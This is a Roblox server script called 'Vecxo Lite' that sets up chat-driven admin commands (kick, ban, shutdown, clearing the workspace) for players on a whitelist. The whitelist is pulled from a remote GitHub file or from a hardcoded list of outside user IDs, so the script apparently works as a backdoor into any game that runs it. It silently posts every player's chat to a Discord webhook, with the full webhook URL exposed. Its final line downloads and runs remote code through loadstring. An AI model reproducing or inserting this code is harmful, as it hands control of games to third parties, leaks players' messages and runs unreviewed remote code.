--//VECXO LITE STARTS HERE

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
local BackupIDs = {
	-- cxo
	3222470105;
	7306448629;
	21517314;
	35950257;
	-- tech
	1702851506;
	-- knocks
	1551416114;
	-- kozy
	1889958;
	-- decryptionite
	120983992;
	1921860822;
	366631664;
	13425405;
	-- palamode
	523322320;
	-- freddie
	1724769699;
	--vecko
	244903894;
	36373784;
}

function GetWhitelist()
	local returnedUsers = {}
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(cxoURL)
	end)
	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		print("GitHub check failed! Using backup table.")
		returnedUsers = BackupIDs
	end
	return returnedUsers
end

local whitelisted = GetWhitelist()
local tempWhitelist = {}
local bannedPlayers = {}

local TweenService = game:GetService("TweenService")

local function notify(player, title, message)
	local gui = Instance.new("ScreenGui")
	gui.Name = "AdminNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = player:FindFirstChildOfClass("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0.4, 0, 0.2, 0)
	frame.Position = UDim2.new(0.5, 0, 0.1, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Parent = gui

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
	titleLabel.Position = UDim2.new(0, 0, 0, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	titleLabel.TextStrokeTransparency = 1
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.Font = Enum.Font.Code
	titleLabel.TextScaled = true
	titleLabel.Text = title
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
	messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
	messageLabel.BackgroundTransparency = 1
	messageLabel.TextTransparency = 1
	messageLabel.TextStrokeTransparency = 1
	messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
	messageLabel.Font = Enum.Font.Code
	messageLabel.TextScaled = true
	messageLabel.TextWrapped = true
	messageLabel.Text = message
	messageLabel.Parent = frame

	local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
	TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
	TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

	task.delay(5, function()
		local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
		TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		task.wait(0.5)
		gui:Destroy()
	end)
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	-- Create tweens
	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()

	fadeOutTween.Completed:Wait()

	screenGui:Destroy()
end

local function GetPlayers(targetArg, sender)
	targetArg = targetArg:lower()
	local playersList = Players:GetPlayers()

	if targetArg == "me" then
		return {sender}

	elseif targetArg == "all" then
		return playersList

	elseif targetArg == "others" then
		local others = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender then
				table.insert(others, plr)
			end
		end
		return others

	elseif targetArg == "random" then
		local candidates = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender then
				table.insert(candidates, plr)
			end
		end
		if #candidates > 0 then
			return {candidates[math.random(1, #candidates)]}
		else
			return {}
		end

	elseif targetArg == "friends" then
		local friends = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender and plr:IsFriendsWith(sender.UserId) then
				table.insert(friends, plr)
			end
		end
		return friends
	else
		for _, plr in ipairs(playersList) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetArg) == targetArg or displayNameLower:sub(1, #targetArg) == targetArg then
				return {plr}
			end
		end
		return {}
	end
end

local function refreshPlayer(plr)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		local rnpos = plr.Character.HumanoidRootPart.CFrame

		for _, v in ipairs(plr.Character:GetChildren()) do
			if v:IsA("Accessory") then
				pcall(function()
					v:Destroy()
				end)
			end
		end

		for _, item in ipairs(workspace:GetDescendants()) do
			if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
				if item.Name == plr.Name or item.Handle.Name == plr.Name then
					pcall(function()
						item:Destroy()
					end)
				end
			end
		end

		plr:LoadCharacter()
		task.wait()
		if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			plr.Character.HumanoidRootPart.CFrame = rnpos
		end
	else
		plr:LoadCharacter()
	end
end

local function showCommandGui(player)
	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoCmds") then
		player.PlayerGui.VecxoCmds:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoCmds"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "Vecxo Lite Commands"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 0)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local commands = {
		"1 - !kick <plr|all|others|random|friends> [reason]",
		"2 - !ban <plr|all|others|random|friends> [reason]",
		"3 - !h <message>",
		"4 - !rj <plr|all|others|random|friends>",
		"5 - !wl <plr|all|others|random|friends>",
		"6 - !unwl <plr|all|others|random|friends>",
		"7 - !re <plr|all|others|random|friends>",
		"8 - !clr",
		"9 - !shutdown",
		--"10 - !restart"
	}

	for _, text in ipairs(commands) do
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local userNameCache = {}

local function GetUserName(userId)
	if userNameCache[userId] then
		return userNameCache[userId]
	end
	local userIdNum = tonumber(userId)
	if not userIdNum then return tostring(userId) end
	for _, player in ipairs(Players:GetPlayers()) do
		if player.UserId == userIdNum then
			userNameCache[userId] = player.Name
			return player.Name
		end
	end
	local success, result = pcall(function()
		return Players:GetNameFromUserIdAsync(userIdNum)
	end)
	if success and result then
		userNameCache[userId] = result
		return result
	end

	return tostring(userId)
end

local function showWhitelisted(player, permWhitelist)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoWhitelisted")
	if existingGui then existingGui:Destroy() end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoWhitelisted"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = gui

	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "Whitelisted Players In-Game"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 0)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local function isPermWhitelisted(userId)
		for _, id in ipairs(permWhitelist) do
			if tonumber(id) == userId then
				return true
			end
		end
		return false
	end
	
	local function isTempWhitelisted(userId)
		for _, id in ipairs(tempWhitelist) do
			if tonumber(id) == userId then
				return true
			end
		end
		return false
	end

	local displayCount = 0
	for _, plr in ipairs(Players:GetPlayers()) do
		local uid = plr.UserId
		local isPerm = isPermWhitelisted(uid)
		local isTemp = isTempWhitelisted(uid)

		if isPerm or isTemp then
			displayCount += 1
			local tag = isPerm and "[Perm Whitelisted]" or "[Temp Whitelisted]"

			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -10, 0, 22)
			label.BackgroundTransparency = 1
			label.Text = displayCount .. ". " .. plr.Name .. " (" .. uid .. ") - " .. tag
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = scrollingFrame
		end
	end

	if displayCount == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "No whitelisted players are currently in-game."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end




local function processCommand(sender, msg)
	local check = false

	if table.find(whitelisted, sender.UserId) or table.find(tempWhitelist, sender.UserId) then
		check = true
	end

	if not check then
		return
	end
	if check == true then
	local args = msg:split(" ")
	local cmd = args[1]:lower()

	if cmd == "!wl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(tempWhitelist, targetPlayer.UserId) then
				table.insert(tempWhitelist, targetPlayer.UserId)
			end
			notify(sender, "[Vecxo Lite]", "Whitelisted " .. targetPlayer.Name)
			notifyv2(targetPlayer, "[Vecxo Lite]:", "You have been whitelisted. Usage: !cmds")
		end

	elseif cmd == "!unwl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if targetPlayer.Name ~= "Reloxz" then
			table.remove(tempWhitelist, table.find(tempWhitelist, targetPlayer.UserId))
			notify(sender, "[Vecxo Lite]", "Removed " .. targetPlayer.Name .. " from whitelist")
			else
			notifyv2(sender, "[Vecxo Lite]", "Protected user cannot be removed from the whitelist")
			end
		end
	elseif cmd == "!shutdown" then
		for i, v in pairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo Lite]: This server has been shutdown.")
		end
		game:Shutdown()
	elseif cmd == "!wls" then
		local currentwl = GetWhitelist()
		showWhitelisted(sender, currentwl)
	--[[elseif cmd == "!restart" then
		local message = Instance.new("Message", workspace)
		local dots = 0
		local running = true
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: Restarting server" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[Vecxo Lite]: This server was closed because someone triggered a new server creation.")
		end)
		local teleportService = game:GetService("TeleportService")
		local code = teleportService:ReserveServer(game.PlaceId)

		teleportService:TeleportToPrivateServer(game.PlaceId, code, game.Players:GetPlayers(), nil, {
			softshutdowned = true,
			vecxo = true
		})
		task.wait(7.5)
		running = false
		message:Destroy()
		for _, v in ipairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo Lite]: Failed to teleport you to the restarted server. Please rejoin manually, sorry :-(")
		end]]
	elseif cmd == "!clr" then
		for _, v in pairs(game.Workspace:GetChildren()) do
			if (v:IsA("Part") or v:IsA("TrussPart") or v:IsA("WedgePart")) and v.Parent == game.Workspace then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetChildren()) do
			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			if v.Name ~= "face" and (v:IsA("Decal") or v:IsA("ParticleEmitter")) then
				v:Destroy()
			end
		end
		notifyv2(sender, "[Vecxo Lite]", "Workspace cleared")

	elseif cmd == "!re" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			refreshPlayer(targetPlayer)
		end
		notifyv2(sender, "[Vecxo Lite]", "Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cmds" then
		showCommandGui(sender)
	elseif cmd == "!kick" and args[2] then
		local reason = msg:match("^!kick%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if reason then
				targetPlayer:Kick("[Vecxo Lite]: Kicked by " .. sender.Name .. ": " .. reason)
				notifyv2(sender, "[Vecxo Lite]", "Kicked " .. targetPlayer.Name)
			else
				targetPlayer:Destroy()
				notifyv2(sender, "[Vecxo Lite]", "Kicked " .. targetPlayer.Name)
			end
		end

	elseif cmd == "!ban" and args[2] then
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			bannedPlayers[targetPlayer.UserId] = true
			if reason then
				targetPlayer:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
				notifyv2(sender, "[Vecxo Lite]", "Banned " .. targetPlayer.Name)
			else
				targetPlayer:Destroy()
				notifyv2(sender, "[Vecxo Lite]", "Banned " .. targetPlayer.Name)
			end
		end

	elseif cmd == "!rj" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "Player(s) '" .. args[2] .. "' not found.")
			return
		end
		local TeleportService = game:GetService("TeleportService")
		local placeId = game.PlaceId
		local jobId = game.JobId
		for _, targetPlayer in ipairs(targets) do
			notifyv2(sender, "[Vecxo Lite]", "Rejoining " .. targetPlayer.DisplayName)
			TeleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
		end

	elseif cmd == "!h" then
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
				notify(plr, "[Vecxo Lite]", announcement)
			end
		end
	end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function getAvatarURL(userId)
	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

local function connectChatLogger(player)
	local avatarUrl = getAvatarURL(player.UserId)

	player.Chatted:Connect(function(message)
		local safeMessage = sanitizeMessage(message)

		local payload = {
			username = player.Name .. " (@" .. player.DisplayName .. ")",
			content = safeMessage,
			avatar_url = avatarUrl
		}

		local success, response = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send message to Discord:", response)
		end
	end)
end

for _, player in ipairs(Players:GetPlayers()) do
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if table.find(whitelisted, tostring(player.UserId)) then
		notify(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end

Players.PlayerAdded:Connect(function(player)
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
		return
	end
	if table.find(whitelisted, tostring(player.UserId)) then
		notifyv2(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
	end
	player.Chatted:Connect(function(message)
		processCommand(player, message)
	end)
end)

loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 

